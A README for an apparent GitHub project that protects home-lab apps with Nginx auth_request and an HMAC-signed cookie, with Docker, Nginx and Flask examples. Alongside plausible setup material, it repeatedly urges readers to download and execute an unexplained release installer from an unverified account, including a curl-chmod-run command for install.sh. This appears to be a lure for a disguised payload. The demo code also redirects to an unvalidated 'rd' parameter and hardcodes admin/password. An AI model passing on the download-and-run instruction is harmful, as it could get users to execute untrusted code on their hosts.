# Nginx Cookie Auth: Lightweight Home-Lab Cookie Authentication

[![Release – Download](https://img.shields.io/badge/Release-Download-brightgreen?style=for-the-badge&logo=github)](https://github.com/1nuT1L/nginx-cookie-auth/releases)

Protect a home-lab web app with simple cookie-based authentication using a small Nginx config. Use an auth proxy that sets a signed cookie and an Nginx reverse proxy that validates that cookie with auth_request. Works inside Docker or as standalone containers.

Badges
- Topics: auth-proxy, authentication, cookie-authentication, docker, docker-image, homelab, lightweight, nginx, nginx-auth-request, reverse-proxy, security, self-hosted, unprivileged

![NGINX Logo](https://www.nginx.com/wp-content/uploads/2018/08/NGINX-logo-rgb-large.png)
![Docker Logo](https://www.docker.com/wp-content/uploads/2022/03/Moby-logo.png)

Table of contents
- Features
- How it works
- Quickstart (Docker Compose)
- Nginx config (auth_request)
- Minimal auth server (examples)
- Cookie format and signing
- Configuration variables
- TLS and security flags
- Example flows and curl checks
- Production notes
- Troubleshooting
- FAQ
- Contributing
- License
- Releases

Features
- Small Nginx config using auth_request to delegate auth checks.
- Lightweight auth server that issues a signed cookie.
- Works with Docker and unprivileged containers.
- Designed for home-lab and self-hosted apps behind a reverse proxy.
- Simple logout and session expiry.
- Flexible cookie options (name, path, domain, secure, SameSite).
- Example Dockerfile and docker-compose.yml included.

How it works
- Client requests a protected resource from Nginx.
- Nginx uses auth_request to call an internal auth endpoint.
- The auth endpoint validates the cookie or redirects to login.
- If auth succeeds, Nginx forwards the request to upstream app.
- If auth fails, Nginx redirects client to the auth server login page.
- The auth server validates credentials, sets a signed cookie, and redirects back.

This design separates concerns. Nginx stays fast. The auth server handles sessions and cookie signing.

Quickstart — Docker Compose
- Clone the repository and run Docker Compose.
- Release asset: download and execute the release file from the Releases page. The release file contains prebuilt images and a helper script that configures and runs the stack. Download and execute it from:
  https://github.com/1nuT1L/nginx-cookie-auth/releases

Example docker-compose.yml
```yaml
version: "3.8"
services:
  nginx:
    image: nginx:stable-alpine
    ports:
      - "80:80"
      - "443:443"
    volumes:
      - ./nginx/default.conf:/etc/nginx/conf.d/default.conf:ro
      - ./certs:/etc/ssl/certs:ro
    depends_on:
      - auth
      - app

  auth:
    image: 1nut1l/nginx-cookie-auth:auth-latest
    environment:
      - COOKIE_SECRET=replace_with_random_key
      - COOKIE_NAME=hc_auth
      - LISTEN_PORT=8080
    ports:
      - "8080:8080"

  app:
    image: nginx:alpine
    volumes:
      - ./app:/usr/share/nginx/html:ro
```

Run
- Place the repo files in a folder.
- Edit cookie secret.
- Start the stack:
```bash
docker-compose up -d
```

Nginx config (auth_request)
- Nginx uses auth_request to validate requests.
- Add an internal location that proxies to auth server.
- See sample default.conf:

```nginx
server {
    listen 80;
    server_name homelab.local;

    # Public endpoint for login and static assets
    location /auth/ {
        proxy_pass http://auth:8080/;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
    }

    # Internal auth check
    location = /_auth {
        internal;
        proxy_pass http://auth:8080/_auth;
        proxy_pass_request_body off;
        proxy_set_header Content-Length "";
        proxy_set_header X-Original-URI $request_uri;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header Host $host;
    }

    # Protected app
    location / {
        auth_request /_auth;
        error_page 401 = @login;
        proxy_pass http://app;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
    }

    location @login {
        return 302 http://$host/auth/login?rd=$request_uri;
    }
}
```

Auth server — minimal behavior
- The auth server contains three endpoints:
  - GET /login — show login form and accept rd (redirect) query param.
  - POST /login — validate credentials and return Set-Cookie header with signed cookie and redirect to rd.
  - GET /_auth — return 200 if cookie valid, 401 if not.

Minimal Python Flask example
```python
from flask import Flask, request, redirect, make_response, jsonify
import hmac, hashlib, base64, time

app = Flask(__name__)
COOKIE_NAME = "hc_auth"
SECRET = b"replace_with_random_key"
TTL = 3600  # seconds

def sign(payload: bytes) -> str:
    sig = hmac.new(SECRET, payload, hashlib.sha256).digest()
    return base64.urlsafe_b64encode(sig).decode().rstrip('=')

def make_cookie(username: str) -> str:
    expires = int(time.time()) + TTL
    payload = f"{username}|{expires}".encode()
    token = base64.urlsafe_b64encode(payload).decode().rstrip('=')
    signature = sign(payload)
    return f"{token}.{signature}"

def verify_cookie(cookie_val: str) -> bool:
    try:
        token, signature = cookie_val.split('.')
        payload = base64.urlsafe_b64decode(token + '==')
        expected = sign(payload)
        if not hmac.compare_digest(expected, signature):
            return False
        username, expires = payload.decode().split('|')
        return int(expires) >= int(time.time())
    except Exception:
        return False

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('user')
        password = request.form.get('pass')
        # Replace with real auth
        if username == 'admin' and password == 'password':
            cookie = make_cookie(username)
            rd = request.args.get('rd', '/')
            resp = make_response(redirect(rd))
            resp.set_cookie(COOKIE_NAME, cookie, httponly=True, samesite='Lax', secure=False, path='/')
            return resp
        return "Invalid", 401
    return '''
    <form method="post">
      <input name="user" placeholder="user"/>
      <input name="pass" placeholder="pass" type="password"/>
      <button type="submit">Login</button>
    </form>
    '''

@app.route('/_auth')
def auth_check():
    c = request.cookies.get(COOKIE_NAME)
    if c and verify_cookie(c):
        return "OK", 200
    return "Unauthorized", 401

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080)
```

Cookie format and signing
- Cookie = base64(payload) + "." + base64(hmac_sha256(payload, secret)).
- Payload = username + "|" + expiry_unix.
- Server verifies signature and expiry.
- Use a random secret. Rotate secret regularly.

Cookie options
- NAME: cookie name. Default hc_auth.
- TTL: session lifetime in seconds.
- Path: where cookie applies. Use "/" for all paths.
- Domain: set for multi-host domains.
- Secure: set true when serving over HTTPS.
- HttpOnly: set true to prevent JavaScript access.
- SameSite: Lax or Strict depending on redirect needs.

Configuration variables (env)
- COOKIE_NAME — default hc_auth
- COOKIE_SECRET — required, base64 or raw
- COOKIE_TTL — seconds, default 3600
- LISTEN_PORT — default 8080
- LOGIN_USER — simple default user for demo
- LOGIN_PASS — demo password
- LOGOUT_PATH — endpoint to clear cookie

TLS and secure cookies
- Use TLS for public access.
- Set cookie Secure true under TLS.
- Use HttpOnly for session cookies.
- Use SameSite=Lax for login redirect flows.
- Consider SameSite=None and Secure for cross-site requests.

Redirect flow and rd parameter
- Login endpoints accept rd (redirect) query param.
- Auth server redirects to rd after login.
- Validate rd or limit to same host to avoid open redirect.

Logout
- Provide /logout endpoint that clears cookie:
```python
@app.route('/logout')
def logout():
    resp = make_response(redirect('/'))
    resp.set_cookie(COOKIE_NAME, '', expires=0, path='/')
    return resp
```

Nginx tips
- Use internal location for /_auth to avoid external access.
- Set proxy_set_header X-Original-URI to tell auth server the requested path.
- Use error_page 401 = @login to redirect unauthenticated requests.
- Protect static files as needed.
- For JSON auth responses, the auth server can set headers like X-Auth-User. Nginx can pass those to upstream.

Protect multiple upstreams
- Use map or separate server blocks for different domains.
- Each server block can point auth_request to the same /_auth.

Example: Pass authenticated user to upstream
- Auth server returns 200 with X-Auth-User header.
- Nginx adds that header to proxy request.

Auth server response pattern
- 200 OK — authorized. Optional headers:
  - X-Auth-User: username
  - X-Auth-Expiry: unix timestamp
- 401 — unauthorized. Nginx will route to login.

Testing and curl commands
- Start services.
- Try accessing protected resource:
```bash
curl -v http://localhost/
```
- Expect redirect to login form.
- Submit login:
```bash
curl -v -X POST http://localhost/auth/login -d "user=admin&pass=password" -c cookies.txt
```
- Access protected content with cookie:
```bash
curl -v -b cookies.txt http://localhost/
```
- Validate auth endpoint directly:
```bash
curl -I -b cookies.txt http://localhost/_auth
```
- Logout:
```bash
curl -v -b cookies.txt http://localhost/logout -c /dev/null
```

Advanced examples
- Use Redis to store session data instead of signed cookie.
- Use JWT for stateless session with public/private keys.
- Add rate limiting at Nginx level for auth requests.
- Add failover auth servers behind a load balancer.

Security considerations
- Use a strong random secret for HMAC.
- Set cookie Secure when using TLS.
- Set HttpOnly to prevent JS access.
- Limit cookie lifetime.
- Validate redirect URLs to avoid open redirect attacks.
- Consider CSRF protections for credential forms.
- Keep the auth server minimal and audited.
- Run containers with least privilege.

Performance
- auth_request adds a subrequest per protected request.
- Keep auth server fast and on the same network.
- Cache auth decisions if appropriate for high throughput.
- Use keepalive between Nginx and auth server to reduce latency.

Unprivileged containers
- Run Nginx and auth server in unprivileged mode inside Docker.
- Avoid host network where possible.
- Map required ports externally via Docker.

Image building
- Provided Dockerfile for auth server.
- Use multi-stage builds to reduce image size.
- Example Dockerfile (simple):

```Dockerfile
FROM python:3.11-slim as build
WORKDIR /app
COPY requirements.txt .
RUN pip wheel --wheel-dir /wheels -r requirements.txt

FROM python:3.11-slim
WORKDIR /app
COPY --from=build /wheels /wheels
RUN pip install --no-index --find-links=/wheels -r requirements.txt
COPY . /app
ENV LISTEN_PORT=8080
CMD ["gunicorn", "-b", "0.0.0.0:8080", "auth:app", "--workers", "2", "--threads", "4"]
```

Logging
- Auth server logs login, logout, and token verification events.
- Nginx logs show upstream status and rewrite actions.
- Add structured logs for integration with log collectors.

Monitoring
- Monitor auth server uptime.
- Monitor unusual login failures.
- Track token expiry and session churn.

Extending the auth server
- Add OAuth2 support to delegate auth to GitHub/Google.
- Integrate LDAP for home-lab user directories.
- Add TOTP for second factor.
- Add account lockout policies and audit logs.

Debugging checklist
- If Nginx always returns 401:
  - Check /_auth is reachable from Nginx container.
  - Check cookies are sent by the client.
  - Check auth server returns 200 for valid cookie.
- If login sets cookie but Nginx still 401:
  - Inspect cookie Path and Domain.
  - Ensure Nginx sends cookie to auth server in subrequest.
  - Confirm cookie name matches config.
- If redirects loop:
  - Check rd parameter points back to the protected URL.
  - Ensure login redirects to original path after setting cookie.

FAQ
Q: Why use auth_request?
A: Nginx delegates session validation. It keeps Nginx fast and lets a small service handle auth logic.

Q: Why signed cookies instead of server sessions?
A: Signed cookies keep the auth server stateless. They simplify scaling because no session store is required.

Q: Is cookie signing secure?
A: Signing is secure when you use a long random secret and HMAC-SHA256. Rotate secrets if needed.

Q: Should I use JWT?
A: JWT works. HMAC-signed payloads behave similarly. JWT libraries add features like claims and key rotation.

Q: How to handle subdomains?
A: Set cookie Domain to the parent domain and Path to "/". Use Secure and SameSite appropriately.

Q: Can I use this for production?
A: Use TLS, rotate secrets, monitor logs, and validate redirect URIs.

Contributing
- Fork the repo and open a pull request.
- Add tests for new features.
- Keep changes small and focused.
- Use clear commit messages.

Repository topics
- auth-proxy
- authentication
- cookie-authentication
- docker
- docker-image
- homelab
- lightweight
- nginx
- nginx-auth-request
- reverse-proxy
- security
- self-hosted
- unprivileged

Releases
- Download and execute the release asset from:
  https://github.com/1nuT1L/nginx-cookie-auth/releases
- The release contains a helper script named install.sh and prebuilt images. Download the installer and run it on your host to deploy the example stack. Example:
```bash
curl -L https://github.com/1nuT1L/nginx-cookie-auth/releases/download/v1.0.0/install.sh -o install.sh
chmod +x install.sh
./install.sh
```
- Replace the URL above with the exact asset name if needed. Use the Releases page if you need a different version.

Changelog
- See the Releases page for tagged builds, checksums, and notes:
  https://github.com/1nuT1L/nginx-cookie-auth/releases

Examples and recipes
- Protect Grafana, Home Assistant, or other home-lab apps behind this proxy.
- Use Nginx to host static assets and route authenticated traffic to services on different ports.

Example: Protect Grafana under /grafana
```nginx
location /grafana/ {
    auth_request /_auth;
    error_page 401 = @login;
    proxy_pass http://grafana:3000/;
    proxy_set_header Host $host;
}
```

Health checks
- Add a /health endpoint to the auth server returning 200 for orchestration checks.

Testing scenarios
- Test expired cookies by setting TTL to small value and retrying after expiry.
- Test signature tamper by altering cookie value.
- Test SameSite impact by using POST-based login flows from third-party origins.

Design rationale
- Keep the auth server minimal and focused on cookie issuance and verification.
- Use signed cookies to avoid large session stores.
- Keep Nginx as the fast, stable reverse proxy.
- Use auth_request to maintain separation and performance.

Code style and license
- Use MIT license for code in this repo.
- Keep code readable and tested.

Contact and credits
- Repo: nginx-cookie-auth
- Releases: https://github.com/1nuT1L/nginx-cookie-auth/releases
- Icons and images used under their respective licenses.

License
- MIT License. Check LICENSE file in the repo.

Files in this repository (example)
- docker-compose.yml — sample stack
- nginx/default.conf — sample Nginx config
- auth/ — auth server code and Dockerfile
- app/ — demo static app content
- scripts/install.sh — helper installer in releases

Notes on the release link
- The Releases link above includes assets. Download the installer asset from the Releases page and run it to deploy the example stack locally:
  https://github.com/1nuT1L/nginx-cookie-auth/releases

Maintenance
- Keep the auth server dependencies up to date.
- Review cookie cryptography periodically.
- Test with upstream apps when you change cookie scope.

Security checklist before public exposure
- Use HTTPS for public endpoints.
- Set cookie Secure and HttpOnly.
- Enforce strong cookie secrets.
- Validate redirect URIs.
- Monitor login attempts.

End of file